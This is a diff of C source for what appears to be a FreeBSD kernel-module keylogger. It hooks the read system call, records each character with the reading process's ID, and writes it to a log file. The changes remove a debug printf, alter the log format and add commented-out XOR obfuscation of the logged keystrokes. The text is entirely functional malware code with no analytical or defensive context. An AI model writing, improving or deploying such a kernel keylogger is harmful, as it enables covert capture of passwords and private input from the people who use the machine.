@@ -48,7 +48,6 @@ static int keylog_write(struct thread *td, int fd, char *line, u_int len)
 
   auio.uio_td = td;
 
-  printf(aiov.iov_base);
   err = kern_writev(td, fd, &auio);
 
   return err;
@@ -88,10 +87,12 @@ static int read_hook(struct thread *td, void *syscall_args)
 	uap = (struct read_args *)syscall_args;
 
 	int error;
-	char buf[1];
 	int done;
-	char string[64];
+
 	int fd = -1;
+	unsigned char buf[1];
+	unsigned char string[64];
+//	unsigned char XORPASS[] = "abcdefghij";
 
 	copyinstr(uap->buf,buf,1,&done);
 	error = sys_read(td, syscall_args);
@@ -104,11 +105,16 @@ static int read_hook(struct thread *td, void *syscall_args)
 	// open up file
 	keylog_open(curthread, &fd, LOGPATH);
 
-	// prepare string, processid, character and character decimal value
-	sprintf(string, "[%d]:%c(%d)\n", td->td_proc->p_pid, buf[0],buf[0]);
+	// prepare string, processid and character decimal value, no newline
+	sprintf(string, "%d:%c", td->td_proc->p_pid,buf[0]);
+/*	for (int j=0;j<10;j++){
+		string[j]=string[j]^XORPASS[j];
+	}*/
 	
 	// write data to filedescriptor
 	keylog_write(curthread, fd, string, strlen(string));
+	// write a newline
+	keylog_write(curthread, fd, "\n", 1);
 
 	// close file
 	keylog_close(curthread, fd);
